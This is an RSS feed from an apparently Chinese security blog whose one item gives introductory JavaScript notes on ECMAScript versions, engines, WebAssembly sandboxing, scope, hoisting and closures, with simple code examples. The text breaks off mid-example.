<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Khala • Posts by &#34;反序列化&#34; tag</title>
        <link>https://mobius-0.github.io</link>
        <description>GLHF</description>
        <language>zh-CN</language>
        <pubDate>Mon, 28 Nov 2022 09:50:11 +0800</pubDate>
        <lastBuildDate>Mon, 28 Nov 2022 09:50:11 +0800</lastBuildDate>
        <category>Hexo</category>
        <category>shoya</category>
        <category>网站</category>
        <category>网络安全</category>
        <category>工具</category>
        <category>虚拟机</category>
        <category>安全</category>
        <category>星际争霸2</category>
        <category>平衡</category>
        <category>杂谈</category>
        <category>小说</category>
        <category>江南</category>
        <category>龙族</category>
        <category>动画</category>
        <category>法律法规</category>
        <category>XSS</category>
        <category>漏洞</category>
        <category>渗透测试</category>
        <category>靶场</category>
        <category>pikachu</category>
        <category>虚拟化</category>
        <category>Docker</category>
        <category>镜像</category>
        <category>标准</category>
        <category>OCI</category>
        <category>CRI</category>
        <category>域名</category>
        <category>DNS</category>
        <category>WEB</category>
        <category>HTTP</category>
        <category>计算机网络</category>
        <category>IPSec</category>
        <category>VPN</category>
        <category>SSL</category>
        <category>TLS</category>
        <category>WiFi</category>
        <category>邮件</category>
        <category>网络协议</category>
        <category>入侵检测</category>
        <category>IDS</category>
        <category>IPS</category>
        <category>防御加固</category>
        <category>管理策略</category>
        <category>分工</category>
        <category>职能</category>
        <category>情报</category>
        <category>运营</category>
        <category>开发过程</category>
        <category>应急响应</category>
        <category>流程</category>
        <category>Linux</category>
        <category>Windows</category>
        <category>攻击溯源</category>
        <category>分析模型</category>
        <category>网络攻防</category>
        <category>蜜罐</category>
        <category>隐藏</category>
        <category>诱导</category>
        <category>防御纵深</category>
        <category>访问控制</category>
        <category>过滤</category>
        <category>框架</category>
        <category>风险</category>
        <category>控制</category>
        <category>渗透</category>
        <category>信息收集</category>
        <category>痕迹清理</category>
        <category>内网</category>
        <category>后门</category>
        <category>免杀</category>
        <category>代理</category>
        <category>Shell</category>
        <category>远程连接</category>
        <category>ASP</category>
        <category>CSharp</category>
        <category>Golang</category>
        <category>Java</category>
        <category>语言</category>
        <category>反序列化</category>
        <category>混淆</category>
        <category>沙箱</category>
        <category>类</category>
        <category>JDK</category>
        <category>JavaScript</category>
        <category>PHP</category>
        <category>PowerShell</category>
        <category>Python</category>
        <category>Ruby</category>
        <category>CSRF</category>
        <category>服务器</category>
        <category>SQL注入</category>
        <category>SSRF</category>
        <category>Cache</category>
        <category>XXE</category>
        <category>XML</category>
        <category>Xpath</category>
        <category>注入</category>
        <category>函数</category>
        <category>绕过</category>
        <category>遍历</category>
        <category>包含</category>
        <category>文件</category>
        <category>目录</category>
        <category>读取</category>
        <category>上传</category>
        <category>中间件</category>
        <category>IIS</category>
        <category>Apache</category>
        <category>Nginx</category>
        <category>逻辑</category>
        <category>策略配置</category>
        <category>端口</category>
        <category>社会工程学</category>
        <category>搜索</category>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/JavaScript/</guid>
            <title>JavaScript</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/JavaScript/</link>
            <category>语言</category>
            <category>反序列化</category>
            <category>沙箱</category>
            <category>JavaScript</category>
            <pubDate>Mon, 28 Nov 2022 09:50:11 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;ecmascript&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ecmascript&#34;&gt;#&lt;/a&gt; ECMAScript&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;ECMAScript 是一种由 ECMA 国际通过 ECMA-262 标准化的脚本程序设计语言，它往往被称为 JavaScript 或 JScript。简单的，可以认为 ECMAScript 是 JavaScript 的一个标准，但实际上后两者是 ECMA-262 标准的实现和扩展。&lt;/p&gt;
&lt;h2 id=&#34;版本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#版本&#34;&gt;#&lt;/a&gt; 版本&lt;/h2&gt;
&lt;p&gt;1997 年 6 月，首版发布。1998 年 6 月，进行了格式修正，以使得其形式与 ISO/IEC16262 国际标准一致。1999 年 12 月，引入强大的正则表达式，更好的词法作用域链处理，新的控制指令，异常处理，错误定义更加明确，数据输出的格式化及其它改变。而后由于关于语言的复杂性出现分歧，第 4 版本被放弃，其中的部分成为了第 5 版本及 Harmony 的基础。&lt;/p&gt;
&lt;p&gt;2009 年 12 月，第五版发布，新增 “严格模式（strict mode）”，澄清了许多第 3 版本的模糊规范，并适应了与规范不一致的真实世界实现的行为。增加了部分新功能，如 getters 及 setters，支持 JSON 以及在对象属性上更完整的反射。&lt;/p&gt;
&lt;p&gt;2015 年 6 月，第 6 版发布，最早被称作是 ECMAScript 6（ES6），添加了类和模块的语法，迭代器，Python 风格的生成器和生成器表达式，箭头函数，二进制数据，静态类型数组，集合（maps，sets 和 weak maps），promise，reflection 和 proxies。&lt;/p&gt;
&lt;p&gt;2016 年 6 月，ECMAScript 2016（ES2016）发布，引入  &lt;code&gt;Array.prototype.includes&lt;/code&gt;  、指数运算符、SIMD 等新特性。&lt;/p&gt;
&lt;p&gt;2017 年 6 月，ECMAScript 2017（ES2017）发布，多个新的概念和语言特性。&lt;/p&gt;
&lt;p&gt;2018 年 6 月，ECMAScript 2018 （ES2018）发布包含了异步循环，生成器，新的正则表达式特性和 rest/spread 语法。&lt;/p&gt;
&lt;h2 id=&#34;es6-特性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#es6-特性&#34;&gt;#&lt;/a&gt; ES6 特性&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;const&lt;/code&gt;  /  &lt;code&gt;let&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;模板字面量&lt;/li&gt;
&lt;li&gt;解构
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;[a, b] = [10, 20]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对象字面量简写法&lt;/li&gt;
&lt;li&gt;&lt;code&gt;for...of&lt;/code&gt;  循环&lt;/li&gt;
&lt;li&gt;&lt;code&gt;...xxx&lt;/code&gt;  展开运算符&lt;/li&gt;
&lt;li&gt;可变参数&lt;/li&gt;
&lt;li&gt;箭头函数&lt;/li&gt;
&lt;li&gt;默认参数函数&lt;/li&gt;
&lt;li&gt;默认值与解构&lt;/li&gt;
&lt;li&gt;类&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#引擎&#34;&gt;#&lt;/a&gt; 引擎&lt;/h1&gt;
&lt;h2 id=&#34;v8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#v8&#34;&gt;#&lt;/a&gt; V8&lt;/h2&gt;
&lt;p&gt;V8 是 Chrome 的 JavaScript 语言处理程序（VM）。其引擎由 TurboFan、Ignition 和 Liftoff 组成。其中 Turbofan 是其优化编译器，Ignition 则是其解释器，Liftoff 是 WebAssembly 的代码生成器。&lt;/p&gt;
&lt;h2 id=&#34;spidermonkey&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spidermonkey&#34;&gt;#&lt;/a&gt; SpiderMonkey&lt;/h2&gt;
&lt;p&gt;SpiderMonkey 是 Mozilla 项目的一部分，是一个用 C/C++ 实现的 JavaScript 脚本引擎。&lt;/p&gt;
&lt;h2 id=&#34;javascriptcore&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#javascriptcore&#34;&gt;#&lt;/a&gt; JavaScriptCore&lt;/h2&gt;
&lt;p&gt;JavaScriptCore 的优化执行分为四个部分，LLInt、Baseline、DFG、FTL。LLInt 是最开始的解释执行部分，Baseline 是暂时的 JIT，DFG 阶段开始做一定的优化，FTL 阶段做了充分的优化。&lt;/p&gt;
&lt;h2 id=&#34;chakracore&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#chakracore&#34;&gt;#&lt;/a&gt; ChakraCore&lt;/h2&gt;
&lt;p&gt;ChakraCore 是一个完整的 JavaScript 虚拟机，由微软实现，用于 Edge 浏览器以及 IE 的后期版本中。&lt;/p&gt;
&lt;h2 id=&#34;jscript&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jscript&#34;&gt;#&lt;/a&gt; JScript&lt;/h2&gt;
&lt;p&gt;JScript 是由微软开发的脚本语言，是微软对 ECMAScript 规范的实现，用于 IE 的早期版本中。&lt;/p&gt;
&lt;h2 id=&#34;jerryscript&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jerryscript&#34;&gt;#&lt;/a&gt; JerryScript&lt;/h2&gt;
&lt;p&gt;JerryScript 是一个适用于嵌入式设备的小型 JavaScript 引擎，由三星开发并维护。&lt;/p&gt;
&lt;h1 id=&#34;webassembly&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#webassembly&#34;&gt;#&lt;/a&gt; WebAssembly&lt;/h1&gt;
&lt;h2 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;简而言之，WASM 是一种分发要在浏览器中执行的代码的新方法。它是一种二进制语言，但是无法直接在处理器上运行。在运行时，代码被编译为中间字节代码，可以在浏览器内快速转换为机器代码，然后比传统 JavaScript 更有效地执行。&lt;/p&gt;
&lt;h2 id=&#34;执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行&#34;&gt;#&lt;/a&gt; 执行&lt;/h2&gt;
&lt;p&gt;虽然浏览器可能以不同的方式来实现 Wasm 支持，但是使用的沙盒环境通常是 JavaScript 沙箱。&lt;/p&gt;
&lt;p&gt;在浏览器中运行时，Wasm 应用程序需要将其代码定义为单独的文件或 JavaScript 块内的字节数组。 然后使用 JavaScript 实例化文件或代码块，目前不能在没有 JavaScript 包装器的情况下直接在页面中调用 Wasm。&lt;/p&gt;
&lt;p&gt;虽然 Wasm 可以用 C / C++ 等语言编写，但它本身不能与沙箱之外的环境进行交互。这意味着当 Wasm 应用程序想要进行输出文本等操作时，它需要调用浏览器提供的功能，然后使用浏览器在某处输出文本。&lt;/p&gt;
&lt;p&gt;Wasm 中的内存是线性的，它在 Wasm 应用程序和 JavaScript 之间共享。 当 Wasm 函数将字符串返回给 JavaScript 时，它实际上返回一个指向 Wasm 应用程序内存空间内位置的指针。 Wasm 应用程序本身只能访问分配给它的 JavaScript 内存部分，而不是整个内存空间。&lt;/p&gt;
&lt;h2 id=&#34;安全&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全&#34;&gt;#&lt;/a&gt; 安全&lt;/h2&gt;
&lt;p&gt;Wasm 的设计从如下几个方面考虑来保证 Wasm 的安全性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保护用户免受由于无意的错误而导致漏洞的应用程序的侵害&lt;/li&gt;
&lt;li&gt;保护用户免受故意编写为恶意的应用程序的侵害&lt;/li&gt;
&lt;li&gt;为开发人员提供良好的缓解措施&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;具体的安全措施有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Wasm 应用程序在沙箱内运行&lt;/li&gt;
&lt;li&gt;Wasm 无法对任意地址进行函数调用。Wasm 采用对函数进行编号的方式，编号存储在函数表中&lt;/li&gt;
&lt;li&gt;间接函数调用受类型签名检查的约束&lt;/li&gt;
&lt;li&gt;调用堆栈受到保护，这意味着无法覆盖返回指针&lt;/li&gt;
&lt;li&gt;实现了控制流完整性，这意味着调用意外的函数将失败&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;作用域与闭包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域与闭包&#34;&gt;#&lt;/a&gt; 作用域与闭包&lt;/h1&gt;
&lt;h2 id=&#34;作用域与作用域链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域与作用域链&#34;&gt;#&lt;/a&gt; 作用域与作用域链&lt;/h2&gt;
&lt;h3 id=&#34;作用域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域&#34;&gt;#&lt;/a&gt; 作用域&lt;/h3&gt;
&lt;p&gt;简单来说，作用域就是变量与函数的可访问范围，即作用域控制着变量与函数的可见性和生命周期。JavaScript 的作用域是靠函数来形成的，也就是说一个函数的变量在函数外不可以访问。&lt;/p&gt;
&lt;p&gt;作用域可以分为全局作用域、局部作用域和块级作用域，其中全局作用域主要有以下三种情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;函数外面定义的变量拥有全局作用域&lt;/li&gt;
&lt;li&gt;未定义直接赋值的变量自动声明为拥有全局作用域&lt;/li&gt;
&lt;li&gt;window 对象的属性拥有全局作用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;局部作用域一般只在固定的代码片段内可访问到，最常见的例如函数内部，所以也会把这种作用域称为函数作用域。&lt;/p&gt;
&lt;h3 id=&#34;作用域泄漏&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域泄漏&#34;&gt;#&lt;/a&gt; 作用域泄漏&lt;/h3&gt;
&lt;p&gt;在 ES5 标准时，只有全局作用域和局部作用域，没有块级作用域，这样可能会造成变量泄漏的问题。例如：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// undefined&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;作用域提升var-hoisting&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域提升var-hoisting&#34;&gt;#&lt;/a&gt; 作用域提升（var Hoisting）&lt;/h3&gt;
&lt;p&gt;在 JavaScript 中，使用 var 在函数或全局内任何地方声明变量相当于在其内部最顶上声明它，这种行为称为 Hoisting。例如下面这段代码等效于第二段代码&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; undefined&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; undefined&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;作用域链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域链&#34;&gt;#&lt;/a&gt; 作用域链&lt;/h3&gt;
&lt;p&gt;当函数被执行时，总是先从函数内部找寻局部变量，如果找不到相应的变量，则会向创建函数的上级作用域寻找，直到找到全局作用域为止，这个过程被称为作用域链。&lt;/p&gt;
&lt;h2 id=&#34;闭包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#闭包&#34;&gt;#&lt;/a&gt; 闭包&lt;/h2&gt;
&lt;p&gt;函数与对其状态即词法环境（lexical environment）的引用共同构成闭包（closure）。也就是说，闭包可以让你从内部函数访问外部函数作用域。在 JavaScript，函数在每次创建时生成闭包。&lt;/p&gt;
&lt;p&gt;在 JavaScript 中，并没有原生的对 private 方法的支持，即一个元素 / 方法只能被同一个类中的其它方法所调用。而闭包则是一种可以被用于模拟私有方法的方案。另外闭包也提供了管理全局命名空间的能力，避免非核心的方法或属性污染了代码的公共接口部分。下面是一个简单的例子：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; Counter &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; privateCounter &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;changeBy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;val&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    privateCounter &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; val&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function-variable function&#34;&gt;increment&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token function&#34;&gt;changeBy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function-variable function&#34;&gt;decrement&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token 